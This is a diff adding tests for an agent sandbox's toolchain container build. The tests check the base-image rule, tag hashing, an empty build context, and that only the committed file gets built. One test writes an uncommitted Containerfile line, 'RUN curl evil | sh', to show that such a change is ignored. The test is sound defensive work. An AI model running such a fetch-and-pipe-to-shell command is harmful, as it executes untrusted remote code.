@@ -2,7 +2,7 @@
 import assert from "node:assert/strict";
 import { EventEmitter } from "node:events";
 import { execFileSync } from "node:child_process";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { PassThrough } from "node:stream";
@@ -10,7 +10,7 @@ import { test } from "node:test";
 import type { ChildProcess } from "node:child_process";
 import { createRunner, type Run, type StartOpts } from "../src/agents/runner.ts";
 import { claudeHarness, argsFor, SANDBOX_NOTE } from "../src/agents/harnesses/claude/harness.ts";
-import { appleContainer, boxEnv, BUNDLE_SCRIPT, containerArgs, numstat, originRepo, readToken, sandboxBranch, type SandboxBox, type SandboxEngine, type SandboxOut, type SandboxState } from "../src/agents/sandbox.ts";
+import { appleContainer, boxEnv, imageIdOf, toolchainTag, toolchainWhy, TOOLCHAIN_FILE, BUNDLE_SCRIPT, containerArgs, numstat, originRepo, readToken, sandboxBranch, type SandboxBox, type SandboxEngine, type SandboxOut, type SandboxState } from "../src/agents/sandbox.ts";
 import { localDesk } from "../src/agents/desk.ts";
 import { createQueue } from "../src/agents/queue.ts";
 import { WORK } from "../src/agents/workdir.ts";
@@ -24,7 +24,11 @@ const tick = (ms = 20) => new Promise((r) => setTimeout(r, ms));
 /** `container network inspect` of a host-only network. */
 const NET_JSON = JSON.stringify([{ configuration: { mode: "hostOnly", name: "dovre-sandbox" }, status: { ipv4Gateway: "192.168.128.1", ipv4Subnet: "192.168.128.0/24" } }]);
 /** The engine's container calls, with the sandbox network there. */
-const withNet = (exec: (bin: string, args: string[]) => Promise<{ ok: boolean; out: string; err?: string }>) => async (bin: string, args: string[]) => (args[0] === "network" ? { ok: true, out: NET_JSON } : exec(bin, args));
+/** `container image inspect` of the base image. */
+const BASE_ID = "a".repeat(64);
+const IMAGE_JSON = JSON.stringify([{ id: BASE_ID }]);
+const withNet = (exec: (bin: string, args: string[], ms?: number) => Promise<{ ok: boolean; out: string; err?: string }>) => async (bin: string, args: string[], ms?: number) =>
+  args[0] === "network" ? { ok: true, out: NET_JSON } : args[0] === "image" && args[2] === "dovre-sandbox" ? { ok: true, out: IMAGE_JSON } : exec(bin, args, ms);
 /** The proxy, not listening: the runs it was given, and those dropped. */
 function fakeEgress() {
   const opened: { key: string; token: string; allow: string[]; dropped: boolean }[] = [];
@@ -455,4 +459,85 @@ test("openSandboxPr: a forge branch not at the run's head is refused; a PR that 
   });
   assert.equal(failing.ok, false);
   assert.deepEqual(deleted, ["/repos/acme/app/git/refs/heads/sandbox/aaaa"]);
+});
+
+test("toolchain file: its last stage must be FROM dovre-sandbox; the tag changes with the base image or the file", () => {
+  assert.equal(toolchainWhy("FROM dovre-sandbox\nRUN npm i -g pnpm@10\n"), undefined);
+  assert.equal(toolchainWhy("FROM golang:1.25 AS go\nRUN true\nfrom --platform=linux/arm64 dovre-sandbox:latest\nCOPY --from=go /usr/local/go /usr/local/go\n"), undefined);
+  assert.match(toolchainWhy("FROM dovre-sandbox AS a\nFROM ubuntu\n") ?? "", /must end on `FROM dovre-sandbox`.*`FROM ubuntu`/);
+  assert.match(toolchainWhy("RUN true\n") ?? "", /no FROM line/);
+  const t = toolchainTag("/code/Skribb App", BASE_ID, "FROM dovre-sandbox\n");
+  assert.match(t, /^dovre-sandbox-skribb-app:[0-9a-f]{16}$/);
+  assert.notEqual(t, toolchainTag("/code/Skribb App", "b".repeat(64), "FROM dovre-sandbox\n"));
+  assert.notEqual(t, toolchainTag("/code/Skribb App", BASE_ID, "FROM dovre-sandbox\nRUN true\n"));
+  assert.equal(imageIdOf(IMAGE_JSON), BASE_ID);
+  assert.equal(imageIdOf("[{\"id\":\"nope\"}]"), undefined);
+  assert.equal(imageIdOf("not json"), undefined);
+});
+
+test("Apple container engine: a repo's toolchain is built from the file at the base with an empty context; runs wait for it, then use it", async () => {
+  const root = mkdtempSync(join(tmpdir(), "dovre-box-"));
+  const repo = join(root, "repo");
+  mkdirSync(join(repo, ".dovre"), { recursive: true });
+  const git = (...a: string[]) => execFileSync("git", a, { cwd: repo, encoding: "utf8" }).trim();
+  git("init", "-q");
+  git("config", "user.name", "t");
+  git("config", "user.email", "t@t");
+  const file = "FROM dovre-sandbox\nUSER root\nRUN npm i -g pnpm@10\nUSER agent\n";
+  writeFileSync(join(repo, TOOLCHAIN_FILE), file);
+  git("add", "-A");
+  git("commit", "-q", "-m", "toolchain");
+  // Changed after the base: not what's built.
+  writeFileSync(join(repo, TOOLCHAIN_FILE), "FROM dovre-sandbox\nRUN curl evil | sh\n");
+  const tokenFile = join(root, "token");
+  writeFileSync(tokenFile, "sk-ant-oat01-test\n", { mode: 0o600 });
+  const builds: { args: string[]; file: string; context: string[]; ms?: number }[] = [];
+  let built = false;
+  let fail = false;
+  const exec = withNet(async (_bin, args, ms) => {
+    if (args[0] === "image" && args[1] === "inspect") return { ok: built, out: "" };
+    if (args[0] === "build") {
+      const f = args[args.indexOf("-f") + 1]!;
+      const ctx = args.at(-1)!;
+      builds.push({ args, file: readFileSync(f, "utf8"), context: readdirSync(ctx), ms });
+      if (fail) return { ok: false, out: "", err: "step 2\nERROR: npm not found" };
+      built = true;
+      return { ok: true, out: "" };
+    }
+    return { ok: true, out: "" };
+  });
+  const { egress } = fakeEgress();
+  const engine = appleContainer({ root: join(root, "boxes"), tokenFile, exec, egress });
+  await tick();
+  assert.throws(() => engine.prepare({ id: "bbbbbbbb-1111", repo }), /toolchain image \(\.dovre\/sandbox\.Containerfile\) is being built/);
+  assert.ok(!existsSync(join(root, "boxes", "bbbbbbbb-1111")), "no clone left behind while it waits");
+  assert.throws(() => engine.prepare({ id: "bbbbbbbb-2222", repo }), /being built/);
+  await tick();
+  assert.equal(builds.length, 1, "built once, however many runs asked");
+  assert.equal(builds[0]!.file, file.trim(), "the file at the base, not the checkout's");
+  assert.deepEqual(builds[0]!.context, [], "nothing of the host goes in");
+  assert.equal(builds[0]!.ms, 30 * 60_000);
+  const tag = toolchainTag(repo, BASE_ID, file.trim());
+  assert.equal(builds[0]!.args[builds[0]!.args.indexOf("-t") + 1], tag);
+  const box = engine.prepare({ id: "bbbbbbbb-3333", repo });
+  assert.equal(box.image, tag);
+  const args = engine.command(box, ["claude"]).args;
+  assert.equal(args[args.indexOf("claude") - 1], tag);
+
+  // A file that changes builds anew; a failed build says why, and isn't tried again at once.
+  writeFileSync(join(repo, TOOLCHAIN_FILE), "FROM dovre-sandbox\nRUN pnpm --version\n");
+  git("commit", "-q", "-am", "pnpm check");
+  built = false;
+  fail = true;
+  assert.throws(() => engine.prepare({ id: "bbbbbbbb-4444", repo }), /being built/);
+  await tick();
+  assert.throws(() => engine.prepare({ id: "bbbbbbbb-5555", repo }), /didn't build: ERROR: npm not found/);
+  assert.equal(builds.length, 2);
+
+  // Not on the base image: refused before anything is built.
+  writeFileSync(join(repo, TOOLCHAIN_FILE), "FROM ubuntu\n");
+  git("commit", "-q", "-am", "wrong base");
+  assert.throws(() => engine.prepare({ id: "bbbbbbbb-6666", repo }), /must end on `FROM dovre-sandbox`/);
+  await tick();
+  assert.equal(builds.length, 2);
 });
